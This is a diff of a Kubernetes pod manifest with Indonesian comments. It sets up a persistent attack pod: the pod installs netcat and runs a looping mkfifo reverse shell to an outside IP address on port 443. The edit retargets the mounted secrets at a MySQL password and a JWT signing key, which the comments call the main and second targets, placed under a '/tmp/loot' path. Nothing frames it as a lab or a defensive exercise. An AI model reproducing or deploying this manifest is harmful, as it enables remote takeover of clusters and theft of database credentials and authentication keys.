@@ -10,27 +10,24 @@ spec:
     command: ["/bin/sh", "-c"]
     args:
     - |
-      # 1. Install ulang senjatanya pas pod baru lahir
       apk add --update netcat-openbsd python3 mysql-client
-      
-      # 2. Tembak reverse shell pake jurus mkfifo
       while true; do
         rm -f /tmp/f; mkfifo /tmp/f
         cat /tmp/f | /bin/sh -i 2>&1 | nc 203.175.125.130 443 > /tmp/f
         sleep 5
       done
     volumeMounts:
-    - name: v-msg
-      mountPath: /tmp/loot/messages
-    - name: v-pay
-      mountPath: /tmp/loot/payment
+    - name: v-mysql
+      mountPath: /tmp/loot/mysql
+    - name: v-jwt
+      mountPath: /tmp/loot/jwt
   volumes:
-  - name: v-msg
+  - name: v-mysql
     secret:
-      secretName: database-certs # <--- BINGO! Ini yang udah diganti
+      secretName: mysql-secret # <--- TARGET UTAMA: PASSWORD DB
       optional: true
-  - name: v-pay
+  - name: v-jwt
     secret:
-      secretName: payment-order-service
+      secretName: jwt-secret # <--- TARGET KEDUA: KUNCI JWT
       optional: true
   restartPolicy: Never
